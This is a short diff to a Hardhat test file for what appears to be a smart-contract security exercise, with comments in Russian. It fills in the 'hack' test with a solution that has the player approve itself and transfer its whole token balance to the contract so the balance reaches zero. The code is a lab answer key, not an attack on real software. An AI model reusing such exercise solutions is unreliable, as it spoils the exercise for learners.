@@ -20,7 +20,13 @@ describe("Coin", function () {
   it("hack", async function () {
     const { Coin, player } = await loadFixture(deployFixture);
 
-    // напишите свой контракт и тесты, чтобы получить нужное состояние контракта
+    balance = await Coin.balanceOf(player);
+    console.log("Current balance is: ", balance);
+
+    await Coin.approve(player, balance);
+    await Coin.transferFrom(player, Coin.getAddress(), balance);
+
+    console.log("New balance is: ", await Coin.balanceOf(player));
 
     // баланс контракта прокси в токене HSE должен стать 0
     expect(await Coin.balanceOf(player)).to.equal(0);
